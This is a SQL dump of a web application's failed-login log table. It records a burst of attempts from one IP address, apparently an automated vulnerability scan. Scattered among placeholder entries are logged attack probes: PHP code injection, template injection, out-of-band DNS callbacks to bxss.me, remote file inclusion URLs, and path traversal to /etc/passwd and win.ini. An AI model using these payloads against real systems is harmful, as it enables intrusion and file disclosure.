INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1066', '', '2023-05-08 03:43:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1067', '', '2023-05-08 03:43:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1068', '', '2023-05-08 03:43:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1069', '', '2023-05-08 03:43:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1070', '', '2023-05-08 03:44:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1071', '', '2023-05-08 03:44:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1072', '', '2023-05-08 03:44:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1073', '', '2023-05-08 03:44:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1074', '', '2023-05-08 03:44:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1075', '', '2023-05-08 03:44:58', '', 'Invalid username/password. Tried with: response.write(9083095*9056418)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1076', '', '2023-05-08 03:44:59', '', 'Invalid username/password. Tried with: \'+response.write(9083095*9056418)+\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1077', '', '2023-05-08 03:44:59', '', 'Invalid username/password. Tried with: \"+response.write(9083095*9056418)+\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1078', '', '2023-05-08 03:44:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1079', '', '2023-05-08 03:44:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1080', '', '2023-05-08 03:44:59', '', 'Invalid username/password. Tried with: ${10000405+10000494}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1081', '', '2023-05-08 03:44:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1082', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1083', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1084', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1085', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: cU9NTFlxekM=', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1086', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1087', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1088', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1089', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1090', '', '2023-05-08 03:45:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1091', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1092', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1093', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1094', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1095', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1096', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1097', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1098', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1099', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1100', '', '2023-05-08 03:45:01', '', 'Invalid username/password. Tried with: )', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1101', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: 1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1102', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1103', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: !(()&&!|*|*|', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1104', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: Http://bxss.me/t/fit.txt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1105', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1106', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: ^(#$!@#$)(()))******', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1107', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: http://bxss.me/t/fit.txt?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1108', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: \'.gethostbyname(lc(\'hitwz\'.\'mezphklv22062.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(117).chr(65).chr(99).chr(7', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1109', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1110', '', '2023-05-08 03:45:02', '', 'Invalid username/password. Tried with: /etc/shells', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1111', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1112', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: \".gethostbyname(lc(\"hitkr\".\"semflihn6c7ff.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(122).chr(73).chr(100).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1113', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1114', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: c:/windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1115', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1116', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1117', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1118', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1119', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1120', '', '2023-05-08 03:45:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1121', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1122', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1123', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1124', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf<esi:include src=\"http://bxss.me/rpb.png\"/>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1125', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1126', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1127', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1128', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: HttP://bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1129', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1130', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1131', '', '2023-05-08 03:45:04', '', 'Invalid username/password. Tried with: bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1132', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1133', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1134', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1135', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1136', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: \"+\"A\".concat(70-3).concat(22*4).concat(102).concat(80).concat(113).concat(83)+(require\"socket\"\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1137', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1138', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: ;assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1139', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1140', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: \'+\'A\'.concat(70-3).concat(22*4).concat(117).concat(89).concat(98).concat(67)+(require\'socket\'\nSocket.gethostbyn', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1141', '', '2023-05-08 03:45:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1142', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: \';print(md5(31337));$a=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1143', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1144', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1145', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: \";print(md5(31337));$a=\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1146', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1147', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1148', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1149', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1150', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1151', '', '2023-05-08 03:45:06', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}\\', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1152', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1153', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1154', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: \'.print(md5(31337)).\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1155', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1156', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1157', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: check_dtr/.', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1158', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1159', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1160', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1161', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1162', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1163', '', '2023-05-08 03:45:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1164', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1165', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1166', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1167', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1168', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1169', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1170', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1171', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1172', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1173', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1174', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1175', '', '2023-05-08 03:45:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1176', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1177', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1178', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1179', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1180', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1181', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1182', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1183', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1184', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1185', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1186', '', '2023-05-08 03:45:09', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1187', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1188', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: \'\"()', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1189', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
